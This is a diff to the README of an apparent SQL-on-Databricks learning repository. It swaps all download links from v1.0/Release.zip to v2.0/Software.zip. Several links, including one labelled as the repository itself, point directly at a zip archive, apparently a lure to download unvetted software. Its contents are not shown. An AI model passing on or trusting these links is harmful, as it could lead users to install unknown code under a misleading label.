@@ -7,9 +7,9 @@ This repository is designed for intensive SQL learning using Databricks, offerin
 Here you will find various SQL scripts, datasets, and exercises to help you master SQL queries, data manipulation, and analysis within the Databricks environment.
 
 ## 📁 Repository Link
-[IntensivoSQLnoDatabricks](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v1.0/Release.zip)
+[IntensivoSQLnoDatabricks](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v2.0/Software.zip)
 
-[![Download Software](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v1.0/Release.zip)](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v2.0/Software.zip)](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v2.0/Software.zip)
 
 If the link doesn't work or you need more information, please check the "Releases" section of this repository.
 
@@ -38,4 +38,4 @@ Begin your SQL learning journey with IntensivoSQLnoDatabricks and take your data
 
 Happy coding! 🎉
 
-🔗 Connect with us: [GitHub Repository](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v1.0/Release.zip)
+🔗 Connect with us: [GitHub Repository](https://github.com/the69ma/IntensivoSQLnoDatabricks/releases/download/v2.0/Software.zip)
